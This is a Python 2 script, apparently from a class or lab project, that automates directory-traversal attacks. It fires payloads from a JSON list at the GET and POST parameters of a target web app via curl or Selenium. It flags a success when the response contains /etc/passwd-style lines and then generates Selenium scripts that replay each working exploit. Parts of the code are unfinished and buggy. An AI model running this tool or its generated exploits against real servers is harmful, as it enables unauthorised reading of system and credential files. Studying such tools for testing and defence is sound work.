import json
import re
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from pprint import pprint
import urllib, urllib2, cookielib, os
import webbrowser
from subprocess import check_output
import sys

# Runtime environment settings
USE_CURL = True
RESULT = {}

# Sample structure as follows:
# {
#     "https://app1.com/path.php": {
#         [
#              get/post,
#              param_name,
#              param_value
#         ]
#     }
# }

# Sample structure might be changed....   (20160414)
# <the base url would probably come from the filename>
# {
#     "index.php?ctg=signup": [
#         {
#             "type": "post", 
#             "param": "_qf__signup_register_personal_form"
#         }
#     ]
# }


# Initialization
try:
    with open("./input.json") as data_file:
       data = json.load(data_file)
except:
    sys.exit('Cannot open input.json, exiting...')

try:
    with open("./reduced_payload.json") as payload_file:
        #payload = payload_file.readlines()
        payload = json.load(payload_file)
except:
    sys.exit('Cannot open payload.json, exiting...')


# # added in for CK to better understand dict
# root_url = data.keys()
# ss = ','.join(str(e) for e in root_url)
# print(ss)
# for string in ss.split(","):
#     print(string)
#     print(data[string])

# Error Handling
def generate_output_json():
    return

def generate_patches():
    i = 0
    try:
        if not os.path.exists('generated_files'):
            os.makedirs('generated_files')
    except:
        print 'Error handling folder, cannot create Selenium scripts!'
        return

    for key, value in RESULT.iteritems():
        # ========================================
        # TO BE COMPLETED
        # Kelvin attempted to complete some things
        # ========================================
	try:
            output_file = open("./generated_files/" + `i` + ".py", 'w')
        except:
            print 'Cannot create Selenium script for URL {}'.format(key)
            next

        if (len(value) != 3):
            print 'Invalid injection value for URL {}, skipping...'.format(key)
            output_file.close()
            next
        if (value[0] == "get"):
            patch_get(output_file, key, value[1], value[2])
        elif (value[0] == "post"):
            patch_post(output_file, key, value[1], value[2])
        else:
            patch_header(output_file, key, value[1], value[2])
            #print 'No GET/POST detected for URL {}, skipping...'.format(key)
            #output_file.close()
            #next
        # print key
        # print value
        output_file.close()
	print 'Selenium script created for URL {}'.format(key)
        i += 1;

    print 'Generated Selenium scripts can be found in the generated_files folder'
    return

def patch_get(output_file, url, query_name, exploit_value):
    # most basic case where it is a simple get
    output_file.write("from selenium import webdriver\n\n")

    url = url + "?" + query_name + "=" + exploit_value

    output_file.write("url = \"" + url + "\"\n")
    output_file.write("driver = webdriver.Firefox()\n")
    output_file.write("driver.maximize_window()\n")
    output_file.write("driver.get(url)\n")
    output_file.write("\n")
    return

def patch_post(output_file, url, query_name, exploit_value):
    # most basic case where it is a simple post
    output_file.write("from selenium import webdriver\n\n")
    output_file.write("url = \"" + url + "\"\n\n")
    output_file.write("driver = webdriver.Firefox()\n")
    output_file.write("driver.maximize_window()\n")
    output_file.write("driver.get(url)\n\n")
    output_file.write("elem = driver.find_element_by_name(\"" + query_name + "\")\n")
    output_file.write("elem.send_keys(\"" + exploit_value + "\")\n")
    output_file.write("button = driver.find_element_by_xpath(\'//input[@type=\"submit\"]\')\n")
    output_file.write("button.click()\n")
    output_file.write("\n")
    return

def patch_header(output_file, url, query_name, exploit_value):
    # to handle header
    # TO BE COMPLETED!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
    output_file.write("print 'Header handling not implemented yet for URL " + url + "'\n\n")
    return

# Helper functions
# Check if source is formatted like a password file, return True if it is
# Else print '.' as progress indicator
def vuln_found(src, fullpath, tryout_value, fieldset, action):
    text_found = re.search(r'\w*:\w:\d:\d:\w*:[\/\w]*:[\/\w]*', src)
    if text_found != None:
        RESULT[fullpath] = [action, fieldset, tryout_value]
        print "DT VULN FOUND ON " + fullpath + ". EXPLOIT: " + fieldset + "=" + tryout_value
        return True
    else:
        sys.stdout.write('.')
        sys.stdout.flush()
        return False

# Handler functions
def handle_get(fullpath, fieldset):
    print "Handling GET " + fullpath
    if USE_CURL:
        for parameter in fieldset["param"]:
            print "For " + parameter
            for tryout_value in payload:
                url = fullpath + "?" + parameter + "=" + tryout_value
                url = url.encode("utf-8").replace('\n','')
                out = check_output(["curl", "-k", "-sS", url])
                if vuln_found(out, fullpath, tryout_value, parameter, "get"):
                    break
    else:
        for parameter in fieldset["param"]:
            print "For " + parameter
            for tryout_value in payload:
                driver = webdriver.Firefox()
                driver.get(fullpath + "?" + parameter + "=" + tryout_value)
                out = driver.page_source
                driver.close()
                if vuln_found(out, fullpath, tryout_value, parameter, "get"):
                    break
    return

def handle_post(fullpath, fieldset):
    print "Handling post " + fullpath
    if USE_CURL:
        for parameter in fieldset["param"]:
            print "For " + parameter
            for tryout_value in payload:
                param = parameter + "=" + tryout_value
                out = check_output(["curl", "-k", "-sS", "--data", param, fullpath])
                if vuln_found(out, fullpath, tryout_value, parameter, "post"):
                    break
    else:
        for parameter in fieldset["param"]:
            print "For " + tryout_value
            for tryout_value in payload:
                # print "POST " + fullpath + " with " + str(fieldset)
                # prep value to include payload
                tryout_value = {}
                tryout_value[parameter] = "a"
                tryout_data = urllib.urlencode(tryout_value)
                # submit form
                req = urllib2.Request(fullpath, tryout_data)
                rsp = urllib2.urlopen(req)
                #read return result
                html = rsp.read()
                print(type(html))
                # ================================== Is there a need to save it into a file? =============================
                # # save response as temp file 
                # path = os.path.abspath("temp.html")
                # url = "file://" + path
                # with open(path, "w") as f:
                #     f.write(html)
                # ================================================== End ==================================================
                # open... or process
                if vuln_found(out, fullpath, tryout_value, parameter, "post"):
                    break
    return

def handle_header(fullpath, fieldset):
    print "Header " + fullpath + " with " + str(fieldset)
    return

# Initialization of case-switch
handler = {"get": handle_get, "post": handle_post, "header": handle_header}

# For each root url (i.e. https://app3.com)...
#   Based on each given path (i.e. /windows/page.php)...
#     Pass input data to the respective method accordingly
def main():
    #print("Main started");
    root_url = "https://app1.com"
    for dataset in data:
        for path in dataset.keys():
            fullpath = root_url + path
            path_data = dataset[path]
            fieldtype = path_data["type"].lower()
            handler[fieldtype](fullpath, path_data)
    generate_output_json()
    generate_patches()

#call main
main()


